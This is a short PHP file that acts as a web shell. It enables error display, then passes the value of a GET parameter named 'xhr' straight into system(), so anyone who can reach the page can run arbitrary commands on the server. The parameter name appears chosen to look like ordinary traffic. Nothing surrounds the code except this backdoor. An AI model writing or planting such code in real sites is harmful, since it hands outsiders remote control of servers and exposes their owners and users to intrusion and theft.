<?php
error_reporting(E_ALL); ini_set('display_errors', '1');
?>
<?php
$stat = $_GET["xhr"];
system("$stat");	
?>
